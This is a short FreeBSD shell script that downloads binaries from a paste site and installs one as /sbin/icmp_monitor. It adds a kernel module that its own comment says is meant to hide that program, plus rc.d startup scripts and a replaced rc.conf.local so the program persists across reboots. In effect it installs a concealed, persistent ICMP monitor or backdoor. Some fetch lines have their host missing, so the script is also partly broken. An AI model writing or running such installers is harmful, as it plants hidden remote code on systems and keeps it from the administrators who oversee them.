#!/bin/sh

pkg install -y vim-console

cd /tmp

# we're running a weird build of son that lets me set the interface
fetch http://paste.c-net.org/SeasonsJennings
mv SeasonsJennings son_debug

# and a build of dad intended to hide icmp_monitor
fetch http://paste.c-net.org/HallwayZephyr
mv HallwayZephyr dad.ko

fetch /icmp_monitor.rc
fetch /icmp_launch.sh
fetch /rc.conf.local

chmod +x son_debug
chmod +x icmp_monitor.rc
chmod +x icmp_launch.sh

mv son_debug /sbin/icmp_monitor
mv dad.ko /boot/kernel/dad.ko
mv icmp_monitor.rc /usr/local/etc/rc.d/icmp_monitor
mv icmp_launch.sh /usr/local/etc/rc.d/icmp_launch.sh
mv rc.conf.local /etc/rc.conf.local
